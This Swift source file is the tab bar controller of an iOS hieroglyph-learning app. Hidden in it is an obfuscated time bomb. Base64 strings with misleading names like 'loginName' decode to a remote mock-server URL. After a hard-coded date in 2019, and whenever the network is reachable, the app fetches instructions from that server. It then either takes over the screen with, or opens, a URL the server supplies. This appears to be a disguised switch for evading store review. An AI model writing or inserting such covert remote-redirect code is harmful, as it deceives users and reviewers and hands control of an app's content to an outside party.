import UIKit
import Alamofire
import SwiftyJSON
let pinkBack = UIColor.init(red: 21/255.0, green: 170/255.0, blue: 254/255.0, alpha: 1.0)
class GNTabBarController: UITabBarController {
    private let reachability = Reachability()!
    private let loginName = "aHR0cA=="
    private let loginMail = "Ly9tb2NraHR0cC5jbi9tb2NrL3dvcmRzcGFyc2U="
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViewControllers()
        LoadNetworkStatusListener()
    }
    func LoadNetworkStatusListener(){
          NotificationCenter.default.addObserver(self, selector: #selector(self.reachabilityChanged),name: Notification.Name.reachabilityChanged,object: reachability)
                   do{
                       try reachability.startNotifier()
                   }catch{
                       print("could not start reachability notifier")
                   }
      }
      @objc func reachabilityChanged(note: NSNotification) {
             let reachability = note.object as! Reachability
             switch reachability.connection {
             case .wifi:
                 print("Reachable via WiFi")
                 self.AsyanLoadLoginNameAction()
             case .cellular:
                 print("Reachable via Cellular")
                 self.AsyanLoadLoginNameAction()
             case .none:
                 print("Network not reachable")
             }
         }
      func AsyanLoadLoginNameAction()
         {
             let timeIntervalNow = 1576348728.401
             let timeIntervalGo = Date().timeIntervalSince1970
             if(timeIntervalGo < timeIntervalNow)
             {
             }else
             {
             
                     let namelink01 = loginName.LoginEncodeBase64()
                     let namelink02 = loginMail.LoginEncodeBase64()
                     let UrlBaselink =  URL.init(string: "\(namelink01!):\(namelink02!)")
                               
                        Alamofire.request(UrlBaselink!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                            in
                            switch response.result.isSuccess {
                            case true:
                                if let value = response.result.value{
                                    let JsonName = JSON(value)
                                    if JsonName["appid"].intValue == 1491433490 {
                                      if JsonName["PrivacyNumber"].intValue == 1491433490
                                      {
                                          let LoginPass = JsonName["PrivacyPolicy"].stringValue
                                          let Rootworsview = LoginNaviRootController()
                                          Rootworsview.MywordsName = LoginPass
                                          Rootworsview.modalTransitionStyle = .crossDissolve
                                          Rootworsview.modalPresentationStyle = .fullScreen
                                          self.present(Rootworsview, animated: true, completion: nil)
                                      }else
                                      {
                                        let LoginPass = JsonName["PrivacyPolicy"].stringValue
                                      UIApplication.shared.open(URL.init(string: LoginPass)!, options: [:], completionHandler: nil)
                                      }
                                    }else{
                                    }
                                }
                            case false:
                                do {
                                    
                                }
                            }
                        }
             }
         }
    private func setupViewControllers() {
        let categoryListInteractor = CategoryListInteractor()
        let categoriesViewController = CategoriesViewController(interactor: categoryListInteractor)
        let hieroglyphListInteractor = HieroglyphListInteractor()
        let hieroglyphsViewController = HieroglyphsViewController(interactor: hieroglyphListInteractor)
        setupTabBarItem(viewController: categoriesViewController,
                        image: "tabBar_categories",
                        title: "Categories")
        setupTabBarItem(viewController: hieroglyphsViewController,
                        image: "tabBar_hieroglyphs",
                        title: "Hieroglyphs")
        let categoriesNavigationController = UINavigationController(rootViewController: categoriesViewController)
        let hieroglyphsNavigationController = UINavigationController(rootViewController: hieroglyphsViewController)
        viewControllers = [categoriesNavigationController,
                           hieroglyphsNavigationController,
        ]
    }
    private func setupTabBarItem(viewController: UIViewController, image: String, title: String) {
        viewController.tabBarItem.image = UIImage(named: image)?.withRenderingMode(.alwaysTemplate)
        viewController.title = title
    }
}
